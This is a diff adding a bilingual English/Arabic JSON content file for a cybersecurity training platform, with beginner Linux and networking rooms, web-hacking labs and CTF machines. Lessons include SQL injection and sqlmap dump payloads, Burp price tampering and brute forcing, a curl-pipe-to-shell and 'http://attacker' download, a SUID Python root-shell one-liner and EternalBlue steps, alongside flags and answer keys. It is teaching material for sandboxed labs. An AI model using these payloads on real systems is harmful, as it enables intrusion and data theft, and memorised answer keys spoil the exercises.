@@ -1,0 +1,590 @@
+{
+    "paths": [
+        {
+            "id": "pre-security",
+            "name": "Pre-Security Path",
+            "nameAr": "المبتدئ الكامل",
+            "description": "Foundation path for complete beginners. Break the fear of the black screen.",
+            "descriptionAr": "مسار تأسيسي لأي شخص لا يعرف شيئاً عن الأنظمة. الهدف: كسر حاجز الخوف من الشاشة السوداء.",
+            "icon": "🛡️",
+            "color": "#22c55e",
+            "difficulty": "beginner",
+            "estimatedHours": 20,
+            "career": {
+                "title": "IT Support Specialist",
+                "titleAr": "أخصائي دعم تقني",
+                "readinessPercent": 30,
+                "avgSalary": "$45,000"
+            },
+            "rooms": [
+                "linux-fundamentals",
+                "networking-101"
+            ]
+        },
+        {
+            "id": "web-hacking",
+            "name": "Web Hacking Path",
+            "nameAr": "مخترق الويب",
+            "description": "Deep focus on OWASP Top 10. The most detailed and powerful path.",
+            "descriptionAr": "التركيز العميق على OWASP Top 10. هذا المسار يجب أن يكون الأقوى والأكثر تفصيلاً.",
+            "icon": "💀",
+            "color": "#ef4444",
+            "difficulty": "intermediate",
+            "estimatedHours": 60,
+            "career": {
+                "title": "Junior Penetration Tester",
+                "titleAr": "مختبر اختراق مبتدئ",
+                "readinessPercent": 60,
+                "avgSalary": "$60,000"
+            },
+            "rooms": [
+                "sql-injection-bakery",
+                "burp-suite-blackbox",
+                "privilege-escalation"
+            ]
+        }
+    ],
+    "rooms": [
+        {
+            "id": "linux-fundamentals",
+            "pathId": "pre-security",
+            "title": "Linux Fundamentals",
+            "titleAr": "أساسيات لينكس",
+            "scenario": "You are a new employee at a server company. Your manager asked you to access the server for the first time and check the files.",
+            "scenarioAr": "أنت موظف جديد في شركة خوادم، ومديرك طلب منك الدخول للسيرفر لأول مرة وتفقد الملفات.",
+            "difficulty": "easy",
+            "points": 300,
+            "estimatedMinutes": 45,
+            "labConfig": {
+                "image": "studyhub/labs:linux-fundamentals-v1",
+                "type": "terminal",
+                "port": 22,
+                "timeout": 60
+            },
+            "tasks": [
+                {
+                    "id": "task-1",
+                    "title": "Where Am I?",
+                    "titleAr": "أين أنا؟",
+                    "description": "Learn the basic navigation commands: pwd, ls, cd",
+                    "descriptionAr": "شرح أوامر pwd, ls, cd",
+                    "content": "## Navigation Commands\n\n### pwd (Print Working Directory)\nShows your current location in the filesystem.\n```bash\n$ pwd\n/home/user\n```\n\n### ls (List)\nLists files and directories.\n```bash\n$ ls\nDocuments  Downloads  welcome.txt\n```\n\n### cd (Change Directory)\nMoves to another directory.\n```bash\n$ cd Documents\n$ pwd\n/home/user/Documents\n```",
+                    "question": "What is the name of the file in the home directory?",
+                    "questionAr": "ما هو اسم الملف الموجود في مجلد الـ home؟",
+                    "answerType": "text",
+                    "answer": "welcome.txt",
+                    "points": 50,
+                    "hints": [
+                        {
+                            "text": "Use the ls command to list files",
+                            "textAr": "استخدم أمر ls لعرض الملفات",
+                            "cost": 5
+                        },
+                        {
+                            "text": "Navigate to /home/user first",
+                            "textAr": "انتقل إلى /home/user أولاً",
+                            "cost": 5
+                        }
+                    ]
+                },
+                {
+                    "id": "task-2",
+                    "title": "Reading Files",
+                    "titleAr": "قراءة الملفات",
+                    "description": "Learn cat, head, grep commands",
+                    "descriptionAr": "شرح cat, head, grep",
+                    "content": "## File Reading Commands\n\n### cat\nDisplays entire file content.\n```bash\n$ cat welcome.txt\nWelcome to Linux!\n```\n\n### head\nShows first 10 lines.\n```bash\n$ head logs.txt\n```\n\n### grep\nSearch for patterns in files.\n```bash\n$ grep \"password\" logs.txt\n[ERROR] password reset failed for user admin\n```",
+                    "question": "Search inside logs.txt for the word 'password'. What is the hidden secret in the log?",
+                    "questionAr": "ابحث داخل ملف logs.txt عن كلمة password. ما هي الكلمة السرية المخفية في اللوج؟",
+                    "answerType": "flag",
+                    "answer": "FLAG{Grep_Master_101}",
+                    "flagHash": "a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6",
+                    "points": 100,
+                    "hints": [
+                        {
+                            "text": "Use grep command with the keyword",
+                            "textAr": "استخدم أمر grep مع الكلمة المفتاحية",
+                            "cost": 5
+                        },
+                        {
+                            "text": "grep password logs.txt",
+                            "textAr": "grep password logs.txt",
+                            "cost": 10
+                        }
+                    ]
+                },
+                {
+                    "id": "task-3",
+                    "title": "The Killer Permissions",
+                    "titleAr": "الصلاحيات القاتلة",
+                    "description": "Learn chmod, chown, sudo commands",
+                    "descriptionAr": "شرح chmod, chown, sudo",
+                    "content": "## Permission Commands\n\n### chmod\nChange file permissions.\n```bash\n$ chmod 755 script.sh\n```\n\n### chown\nChange file ownership.\n```bash\n$ sudo chown root:root file.txt\n```\n\n### sudo\nRun commands as superuser.\n```bash\n$ sudo cat /root/secret.txt\n```\n\n## Task\nTry to read /root/secret.txt (it will fail). Now use sudo.",
+                    "question": "Read /root/secret.txt using sudo. What is the flag?",
+                    "questionAr": "حاول قراءة ملف /root/secret.txt. (سيفشل). الآن استخدم sudo.",
+                    "answerType": "flag",
+                    "answer": "FLAG{Sudo_Power_Unleashed}",
+                    "flagHash": "q1w2e3r4t5y6u7i8o9p0a1s2d3f4g5h6",
+                    "points": 150,
+                    "hints": [
+                        {
+                            "text": "You need elevated privileges",
+                            "textAr": "تحتاج صلاحيات مرتفعة",
+                            "cost": 5
+                        },
+                        {
+                            "text": "sudo cat /root/secret.txt",
+                            "textAr": "sudo cat /root/secret.txt",
+                            "cost": 10
+                        }
+                    ]
+                }
+            ]
+        },
+        {
+            "id": "networking-101",
+            "pathId": "pre-security",
+            "title": "Networking 101",
+            "titleAr": "كيف تعمل الشبكات؟",
+            "scenario": "The internet stopped working at the company. You need to use diagnostic tools to find the cause.",
+            "scenarioAr": "توقف الإنترنت في الشركة، وعليك استخدام أدوات التشخيص لمعرفة السبب.",
+            "difficulty": "easy",
+            "points": 250,
+            "estimatedMinutes": 40,
+            "tools": [
+                "ping",
+                "traceroute",
+                "telnet"
+            ],
+            "labConfig": {
+                "image": "studyhub/labs:networking-101-v1",
+                "type": "terminal",
+                "port": 22,
+                "timeout": 60
+            },
+            "tasks": [
+                {
+                    "id": "task-1",
+                    "title": "Is the Server Alive?",
+                    "titleAr": "هل السيرفر حي؟",
+                    "description": "Learn ICMP principle and Ping",
+                    "descriptionAr": "مبدأ ICMP والـ Ping",
+                    "content": "## ICMP & Ping\n\nICMP (Internet Control Message Protocol) is used to send error messages and operational information.\n\n### Ping\n```bash\n$ ping 10.10.10.5\nPING 10.10.10.5 (10.10.10.5) 56(84) bytes of data.\n64 bytes from 10.10.10.5: icmp_seq=1 ttl=64 time=0.5 ms\n```\n\nIf you receive replies, the server is alive!",
+                    "question": "Ping the address 10.10.10.5. Does it work? (yes/no)",
+                    "questionAr": "قم بعمل Ping للعنوان 10.10.10.5، هل يعمل؟",
+                    "answerType": "text",
+                    "answer": "yes",
+                    "points": 50,
+                    "hints": [
+                        {
+                            "text": "ping 10.10.10.5",
+                            "textAr": "ping 10.10.10.5",
+                            "cost": 5
+                        }
+                    ]
+                },
+                {
+                    "id": "task-2",
+                    "title": "The Magic OSI Model",
+                    "titleAr": "النموذج السحري OSI Model",
+                    "description": "Learn the 7 layers simply",
+                    "descriptionAr": "شرح الطبقات السبع ببساطة",
+                    "content": "## OSI Model Layers\n\n| Layer | Name | Example |\n|-------|------|--------|\n| 7 | Application | HTTP, FTP, DNS |\n| 6 | Presentation | SSL, TLS |\n| 5 | Session | NetBIOS |\n| 4 | Transport | TCP, UDP |\n| 3 | Network | IP, ICMP |\n| 2 | Data Link | Ethernet, MAC |\n| 1 | Physical | Cables, Hubs |",
+                    "question": "At which layer does the HTTP protocol work?",
+                    "questionAr": "في أي طبقة يعمل بروتوكول HTTP؟",
+                    "answerType": "number",
+                    "answer": "7",
+                    "points": 50,
+                    "hints": [
+                        {
+                            "text": "HTTP is an Application layer protocol",
+                            "textAr": "HTTP هو بروتوكول طبقة التطبيق",
+                            "cost": 5
+                        }
+                    ]
+                }
+            ]
+        },
+        {
+            "id": "sql-injection-bakery",
+            "pathId": "web-hacking",
+            "title": "SQL Injection Bakery",
+            "titleAr": "مخبز الحقن",
+            "scenario": "A local bakery got hacked. The owner asks you to test the product search code.",
+            "scenarioAr": "متجر حلويات محلي تعرض للاختراق. المالك يطلب منك فحص كود البحث عن المنتجات.",
+            "difficulty": "easy",
+            "points": 500,
+            "estimatedMinutes": 60,
+            "labConfig": {
+                "image": "studyhub/labs:sqli-bakery-v1",
+                "type": "web",
+                "port": 80,
+                "timeout": 120
+            },
+            "tasks": [
+                {
+                    "id": "task-1",
+                    "title": "Breaking Logic (Authentication Bypass)",
+                    "titleAr": "كسر المنطق",
+                    "description": "Learn how OR 1=1 works",
+                    "descriptionAr": "كيف يعمل OR 1=1",
+                    "content": "## SQL Injection - Authentication Bypass\n\nWhen an application builds SQL queries by concatenating user input:\n```sql\nSELECT * FROM users WHERE username='$user' AND password='$pass'\n```\n\nWe can inject:\n```\nUsername: admin' OR 1=1--\nPassword: anything\n```\n\nResulting query:\n```sql\nSELECT * FROM users WHERE username='admin' OR 1=1--' AND password='anything'\n```\n\nThe `--` comments out the rest, and `1=1` is always true!",
+                    "question": "Login as Admin without knowing the password. What flag appears?",
+                    "questionAr": "سجل الدخول كـ Admin دون معرفة الباسورد. ما هو الفلاق؟",
+                    "answerType": "flag",
+                    "answer": "FLAG{Login_Bypassed_Succesfully}",
+                    "flagHash": "b5c6d7e8f9g0h1i2j3k4l5m6n7o8p9q0",
+                    "payload": "' OR 1=1--",
+                    "points": 150,
+                    "hints": [
+                        {
+                            "text": "Try using ' OR 1=1",
+                            "textAr": "جرب استخدام ' OR 1=1",
+                            "cost": 5
+                        },
+                        {
+                            "text": "Check the login form source code",
+                            "textAr": "افحص كود فورم تسجيل الدخول",
+                            "cost": 5
+                        },
+                        {
+                            "text": "Full payload: ' OR 1=1--",
+                            "textAr": "البايلود الكامل: ' OR 1=1--",
+                            "cost": 10
+                        }
+                    ]
+                },
+                {
+                    "id": "task-2",
+                    "title": "Stealing the Menu (UNION Based)",
+                    "titleAr": "سرقة القائمة",
+                    "description": "Merge tables using UNION SELECT",
+                    "descriptionAr": "دمج الجداول بـ UNION SELECT",
+                    "content": "## UNION Based SQL Injection\n\nUNION allows combining results from multiple queries:\n```sql\nSELECT name, price FROM products WHERE id=1\nUNION\nSELECT username, password FROM users\n```\n\n### Steps:\n1. Find number of columns\n2. Find column data types\n3. Extract data\n\n```\n1' UNION SELECT username,password FROM users--\n```",
+                    "question": "Extract usernames and passwords from the users table. What is the flag?",
+                    "questionAr": "استخرج أسماء المستخدمين والباسوردات من جدول users.",
+                    "answerType": "flag",
+                    "answer": "FLAG{Database_Dumped_3306}",
+                    "flagHash": "r1s2t3u4v5w6x7y8z9a0b1c2d3e4f5g6",
+                    "points": 200,
+                    "hints": [
+                        {
+                            "text": "Find the number of columns first",
+                            "textAr": "ابحث عن عدد الأعمدة أولاً",
+                            "cost": 5
+                        },
+                        {
+                            "text": "Use ORDER BY to find columns",
+                            "textAr": "استخدم ORDER BY لإيجاد الأعمدة",
+                            "cost": 5
+                        }
+                    ]
+                },
+                {
+                    "id": "task-3",
+                    "title": "Automation (SQLMap)",
+                    "titleAr": "الأتمتة",
+                    "description": "Using sqlmap tool",
+                    "descriptionAr": "استخدام أداة sqlmap",
+                    "content": "## SQLMap - Automatic SQL Injection\n\nSQLMap automates the detection and exploitation of SQL injection flaws.\n\n```bash\n# Basic usage\nsqlmap -u \"http://target.com/search?id=1\" --dbs\n\n# Dump specific database\nsqlmap -u \"http://target.com/search?id=1\" -D bakery --tables\n\n# Dump table contents\nsqlmap -u \"http://target.com/search?id=1\" -D bakery -T users --dump\n```\n\n### Options:\n- `--dbs`: List databases\n- `--tables`: List tables\n- `--dump`: Extract data\n- `--batch`: Run without user input",
+                    "question": "Use sqlmap to extract data automatically. Enter 'completed' when done.",
+                    "questionAr": "استخدم الأداة لاستخراج الداتا تلقائياً.",
+                    "answerType": "text",
+                    "answer": "completed",
+                    "points": 150,
+                    "hints": [
+                        {
+                            "text": "sqlmap -u 'URL' --dbs",
+                            "textAr": "sqlmap -u 'URL' --dbs",
+                            "cost": 5
+                        }
+                    ]
+                }
+            ]
+        },
+        {
+            "id": "burp-suite-blackbox",
+            "pathId": "web-hacking",
+            "title": "Burp Suite: The Black Box",
+            "titleAr": "Burp Suite: الصندوق الأسود",
+            "scenario": "No hacker can live without this tool. Learn how to intercept and modify requests.",
+            "scenarioAr": "لا غنى لأي هكر عن هذه الأداة. تعلم كيف تعترض الطلبات وتعدلها.",
+            "difficulty": "medium",
+            "points": 450,
+            "estimatedMinutes": 50,
+            "labConfig": {
+                "image": "studyhub/labs:burp-practice-v1",
+                "type": "web",
+                "port": 80,
+                "timeout": 120
+            },
+            "tasks": [
+                {
+                    "id": "task-1",
+                    "title": "Setup",
+                    "titleAr": "الإعداد",
+                    "description": "Connect browser to proxy (FoxyProxy)",
+                    "descriptionAr": "كيفية ربط المتصفح بالبروكسي (FoxyProxy)",
+                    "content": "## Burp Suite Setup\n\n### Step 1: Configure Proxy\n1. Open Burp Suite\n2. Go to Proxy > Options\n3. Ensure listener is on 127.0.0.1:8080\n\n### Step 2: Configure Browser\n1. Install FoxyProxy extension\n2. Add new proxy: 127.0.0.1:8080\n3. Enable the proxy\n\n### Step 3: Import CA Certificate\n1. Visit http://burp in browser\n2. Download CA Certificate\n3. Install in browser's certificate store",
+                    "question": "Configure Burp Suite and browser. Enter 'ready' when done.",
+                    "questionAr": "قم بإعداد Burp Suite والمتصفح. أدخل 'ready' عند الانتهاء.",
+                    "answerType": "text",
+                    "answer": "ready",
+                    "points": 50,
+                    "hints": []
+                },
+                {
+                    "id": "task-2",
+                    "title": "Repeater",
+                    "titleAr": "التكرار",
+                    "description": "Send the same request multiple times with small changes",
+                    "descriptionAr": "إرسال نفس الطلب عدة مرات مع تغيير بسيط",
+                    "content": "## Burp Repeater\n\nRepeater allows you to manually modify and resend requests.\n\n### Workflow:\n1. Intercept request in Proxy\n2. Right-click > Send to Repeater\n3. Modify the request\n4. Click Send\n5. Analyze the response\n\n### Task:\nIntercept a purchase request and change the product price from $100 to $1.",
+                    "question": "Intercept the purchase request and change the price from 100$ to 1$. What flag appears?",
+                    "questionAr": "اعترض طلب الشراء، وغير سعر المنتج من 100$ إلى 1$.",
+                    "answerType": "flag",
+                    "answer": "FLAG{Price_Manipulation_Is_Fun}",
+                    "flagHash": "h1i2j3k4l5m6n7o8p9q0r1s2t3u4v5w6",
+                    "points": 200,
+                    "hints": [
+                        {
+                            "text": "Look for price parameter in POST data",
+                            "textAr": "ابحث عن معامل السعر في بيانات POST",
+                            "cost": 5
+                        },
+                        {
+                            "text": "Change price=100 to price=1",
+                            "textAr": "غير price=100 إلى price=1",
+                            "cost": 10
+                        }
+                    ]
+                },
+                {
+                    "id": "task-3",
+                    "title": "Brute Force (Intruder)",
+                    "titleAr": "القوة الغاشمة",
+                    "description": "Try 1000 passwords per minute",
+                    "descriptionAr": "تجربة 1000 باسورد في الدقيقة",
+                    "content": "## Burp Intruder\n\nIntruder automates customized attacks.\n\n### Attack Types:\n- **Sniper**: Single payload set\n- **Battering Ram**: Same payload all positions\n- **Pitchfork**: Multiple payload sets in sync\n- **Cluster Bomb**: All combinations\n\n### Workflow:\n1. Send request to Intruder\n2. Mark payload positions with §\n3. Configure payload list (rockyou.txt)\n4. Start attack\n5. Analyze responses by length/status",
+                    "question": "Crack the admin password using a mini rockyou.txt list. Enter the password.",
+                    "questionAr": "كسر باسورد حساب admin باستخدام قائمة rockyou.txt مصغرة.",
+                    "answerType": "text",
+                    "answer": "sunshine",
+                    "points": 200,
+                    "hints": [
+                        {
+                            "text": "Use Sniper attack type",
+                            "textAr": "استخدم نوع هجوم Sniper",
+                            "cost": 5
+                        },
+                        {
+                            "text": "Look for different response length",
+                            "textAr": "ابحث عن اختلاف في طول الاستجابة",
+                            "cost": 10
+                        }
+                    ]
+                }
+            ]
+        },
+        {
+            "id": "privilege-escalation",
+            "pathId": "web-hacking",
+            "title": "Admin Privileges",
+            "titleAr": "امتيازات المدير",
+            "scenario": "You hacked the server and entered as a regular user. Your mission now is to become Root.",
+            "scenarioAr": "لقد اخترقت السيرفر ودخلت كمستخدم عادي (User). مهمتك الآن أن تصبح (Root).",
+            "difficulty": "medium",
+            "points": 600,
+            "estimatedMinutes": 75,
+            "labConfig": {
+                "image": "studyhub/labs:privesc-linux-v1",
+                "type": "terminal",
+                "port": 22,
+                "timeout": 120
+            },
+            "tasks": [
+                {
+                    "id": "task-1",
+                    "title": "Enumeration",
+                    "titleAr": "التعداد",
+                    "description": "Using LinPEAS script",
+                    "descriptionAr": "استخدام سكربت LinPEAS",
+                    "content": "## Linux Privilege Escalation - Enumeration\n\n### LinPEAS\nLinPEAS is a script that searches for possible privilege escalation paths.\n\n```bash\n# Download and run\ncurl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh\n\n# Or from local\nwget http://attacker/linpeas.sh\nchmod +x linpeas.sh\n./linpeas.sh\n```\n\n### Manual Checks:\n```bash\n# SUID files\nfind / -perm -4000 2>/dev/null\n\n# Writable files\nfind / -writable 2>/dev/null\n\n# Sudo permissions\nsudo -l\n```",
+                    "question": "What file has abnormal SUID permissions?",
+                    "questionAr": "ما هو الملف الذي يملك صلاحيات SUID غير طبيعية؟",
+                    "answerType": "text",
+                    "answer": "/usr/bin/python3",
+                    "points": 200,
+                    "hints": [
+                        {
+                            "text": "Use find command with -perm -4000",
+                            "textAr": "استخدم أمر find مع -perm -4000",
+                            "cost": 5
+                        },
+                        {
+                            "text": "find / -perm -4000 2>/dev/null",
+                            "textAr": "find / -perm -4000 2>/dev/null",
+                            "cost": 10
+                        }
+                    ]
+                },
+                {
+                    "id": "task-2",
+                    "title": "Exploiting GTFOBins",
+                    "titleAr": "استغلال GTFOBins",
+                    "description": "Use Python to open Root shell",
+                    "descriptionAr": "كيفية استخدام Python لفتح Shell بصلاحيات Root",
+                    "content": "## GTFOBins\n\nGTFOBins is a curated list of Unix binaries that can be exploited.\n\n### Python SUID Exploitation\nWhen Python has SUID bit set:\n\n```bash\n# Check GTFOBins for python\n./python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'\n```\n\nThe `-p` flag preserves the effective user ID (root).\n\n### Verification\n```bash\nwhoami\n# should output: root\nid\n# should show uid=0(root)\n```",
+                    "question": "Execute the command to get Root. What is the flag in /root/flag.txt?",
+                    "questionAr": "نفذ الأمر للحصول على Root. ما هو الفلاق؟",
+                    "answerType": "flag",
+                    "answer": "FLAG{Root_Access_Granted_King}",
+                    "flagHash": "x1y2z3a4b5c6d7e8f9g0h1i2j3k4l5m6",
+                    "points": 400,
+                    "hints": [
+                        {
+                            "text": "Use python3 with os.execl",
+                            "textAr": "استخدم python3 مع os.execl",
+                            "cost": 5
+                        },
+                        {
+                            "text": "python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
+                            "textAr": "python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
+                            "cost": 15
+                        }
+                    ]
+                }
+            ]
+        }
+    ],
+    "ctf_challenges": [
+        {
+            "id": "mr-robot",
+            "title": "Mr. Robot",
+            "titleAr": "السيد روبوت",
+            "description": "Machine inspired by the TV show. Find the three keys.",
+            "descriptionAr": "ماكينة مستوحاة من المسلسل. ابحث عن المفاتيح الثلاثة.",
+            "difficulty": "easy",
+            "points": 800,
+            "category": "box",
+            "expectedSteps": [
+                "Scan the website and discover robots.txt",
+                "Download the hidden dictionary file",
+                "Crack the WordPress admin password",
+                "Exploit a WordPress vulnerability to get shell",
+                "Find user.txt and root.txt"
+            ],
+            "expectedStepsAr": [
+                "فحص الموقع واكتشاف robots.txt",
+                "تحميل ملف القاموس المخفي",
+                "كسر باسورد لوحة Wordpress",
+                "استغلال ثغرة في Wordpress للحصول على Shell",
+                "إيجاد user.txt و root.txt"
+            ],
+            "flags": {
+                "user": "FLAG{MR_ROBOT_USER_KEY_2}",
+                "root": "FLAG{MR_ROBOT_ROOT_KEY_3}"
+            },
+            "labConfig": {
+                "image": "studyhub/ctf:mr-robot-v1",
+                "type": "box",
+                "port": null,
+                "timeout": 240
+            },
+            "hints": [
+                {
+                    "text": "Check robots.txt first",
+                    "textAr": "افحص robots.txt أولاً",
+                    "cost": 10
+                },
+                {
+                    "text": "WordPress version is vulnerable",
+                    "textAr": "نسخة Wordpress بها ثغرات",
+                    "cost": 15
+                },
+                {
+                    "text": "Look for SUID binaries for root",
+                    "textAr": "ابحث عن ملفات SUID للـ root",
+                    "cost": 20
+                }
+            ]
+        },
+        {
+            "id": "eternal-blue",
+            "title": "Eternal Blue",
+            "titleAr": "الأزرق الأبدي",
+            "description": "An old Windows 7 that wasn't updated. Classic SMB vulnerability.",
+            "descriptionAr": "ويندوز 7 قديم لم يتم تحديثه. كلاسيكي جداً.",
+            "difficulty": "medium",
+            "points": 1000,
+            "category": "box",
+            "objective": "Learn Metasploit and SMB exploitation",
+            "objectiveAr": "تعلم استخدام Metasploit وثغرة SMB",
+            "expectedSteps": [
+                "Fuzzing with Nmap to discover open port 445",
+                "Use msfconsole",
+                "Execute exploit/windows/smb/ms17_010_eternalblue",
+                "You are now NT AUTHORITY\\SYSTEM"
+            ],
+            "expectedStepsAr": [
+                "Fuzzing بـ Nmap لاكتشاف بورت 445 مفتوح",
+                "استخدام msfconsole",
+                "تنفيذ exploit/windows/smb/ms17_010_eternalblue",
+                "أنت الآن NT AUTHORITY\\SYSTEM"
+            ],
+            "flags": {
+                "user": "FLAG{ETERNAL_BLUE_LOCAL_USER}",
+                "root": "FLAG{ETERNAL_BLUE_SYSTEM_PWNED}"
+            },
+            "labConfig": {
+                "image": "studyhub/ctf:eternal-blue-v1",
+                "type": "box",
+                "port": 445,
+                "timeout": 240
+            },
+            "hints": [
+                {
+                    "text": "nmap -sV -p 445 TARGET",
+                    "textAr": "nmap -sV -p 445 TARGET",
+                    "cost": 10
+                },
+                {
+                    "text": "search ms17_010 in msfconsole",
+                    "textAr": "ابحث عن ms17_010 في msfconsole",
+                    "cost": 15
+                },
+                {
+                    "text": "Set RHOSTS and LHOST correctly",
+                    "textAr": "اضبط RHOSTS و LHOST بشكل صحيح",
+                    "cost": 20
+                }
+            ]
+        }
+    ],
+    "career_indicators": {
+        "pre-security": {
+            "title": "IT Support Specialist",
+            "titleAr": "أخصائي دعم تقني",
+            "readiness": 30,
+            "avgSalary": "$45,000",
+            "message": "You are now 30% qualified for an IT Support Specialist position with an average salary of $45,000/year",
+            "messageAr": "أنت الآن مؤهل بنسبة 30% لوظيفة أخصائي دعم تقني بمتوسط راتب $45,000 سنوياً"
+        },
+        "web-hacking": {
+            "title": "Junior Penetration Tester",
+            "titleAr": "مختبر اختراق مبتدئ",
+            "readiness": 60,
+            "avgSalary": "$60,000",
+            "message": "You are now 60% qualified for a Junior Penetration Tester position with an average salary of $60,000/year",
+            "messageAr": "أنت الآن مؤهل بنسبة 60% لوظيفة مختبر اختراق مبتدئ بمتوسط راتب $60,000 سنوياً"
+        },
+        "advanced-pentesting": {
+            "title": "Senior Penetration Tester",
+            "titleAr": "مختبر اختراق أول",
+            "readiness": 85,
+            "avgSalary": "$95,000",
+            "message": "You are now 85% qualified for a Senior Penetration Tester position with an average salary of $95,000/year",
+            "messageAr": "أنت الآن مؤهل بنسبة 85% لوظيفة مختبر اختراق أول بمتوسط راتب $95,000 سنوياً"
+        }
+    }
+}
